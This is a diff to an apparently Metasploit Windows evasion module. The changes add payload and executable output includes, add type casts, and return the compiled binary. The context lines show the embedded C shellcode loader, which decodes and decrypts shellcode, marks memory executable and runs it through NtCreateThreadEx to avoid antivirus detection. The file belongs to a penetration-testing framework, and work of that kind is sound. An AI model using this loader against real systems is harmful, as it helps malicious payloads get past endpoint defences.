@@ -1,6 +1,11 @@
 require 'metasploit/framework/compiler/mingw'
 require 'metasploit/framework/compiler/windows'
 class MetasploitModule < Msf::Evasion
+
+  include Msf::ModuleInputs::Payload
+  include Msf::ModuleOutputs::Executable
+  include Msf::ModuleOutputs::ExecutableTypes::EXE
+  
   RC4 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')
   BASE64 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'base64.h')
   def initialize(info = {})
@@ -463,7 +468,7 @@ class MetasploitModule < Msf::Evasion
             SIZE_T size = base64decode(shellcode, enc_shellcode, b64len);
             PVOID bAddress = NULL;
             int process_id = GetCurrentProcessId();
-            cID.UniqueProcess = process_id;
+            cID.UniqueProcess = (HANDLE)process_id;
             NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
             NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             int n = 0;
@@ -490,7 +495,7 @@ class MetasploitModule < Msf::Evasion
             NtProtectVirtualMemory(pHandle, &bAddress, &size, PAGE_EXECUTE, &old);
             #{s if datastore['SLEEP'] > 0};
             HANDLE thread = NULL;
-            NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, NULL, NULL, NULL, NULL, NULL);
+            NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, (ULONG)NULL, (SIZE_T)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
             WaitForSingleObject(thread, INFINITE);
             NtClose(thread);
             NtClose(pHandle);
@@ -548,6 +553,7 @@ class MetasploitModule < Msf::Evasion
     bin = File.binread(comp_file)
     file_create(bin)
     comp_obj.cleanup_files
+    bin
   end
 
   def run
